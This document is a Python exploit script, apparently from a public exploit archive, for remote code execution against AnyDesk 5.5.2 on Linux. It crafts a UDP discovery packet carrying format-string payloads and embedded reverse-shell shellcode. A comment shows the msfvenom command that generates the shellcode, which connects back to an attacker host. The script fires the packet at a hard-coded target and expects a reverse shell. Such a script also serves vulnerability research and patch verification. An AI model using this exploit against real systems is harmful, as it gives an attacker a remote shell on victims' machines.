# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '10.10.226.12'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linu+x/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x8b\x61\x04"
shellcode += b"\x92\x7a\x09\xe2\xa9\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xe1\x48\x5c\x0b\x10"
shellcode += b"\x0b\xbd\xc3\x8a\x3f\x0b\x97\x32\x9e\xaa\x10"
shellcode += b"\x89\x61\x15\xce\x70\x01\xe2\x3f\xda\x29\x8d"
shellcode += b"\x74\x10\x19\xb8\xc3\xa1\x39\x0b\x97\x10\x0a"
shellcode += b"\xbc\xe1\x74\xaf\x6e\xb3\x22\x06\xe7\xdc\x7d"
shellcode += b"\x0b\x3f\xca\xe3\x41\x59\x86\xe9\x08\x6a\xbd"
shellcode += b"\x09\x61\xe2\xfa\xc3\xe8\xe3\xc0\x2d\x41\x6b"
shellcode += b"\x4f\x84\x64\x04\x92\x7a\x09\xe2\xa9"


print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
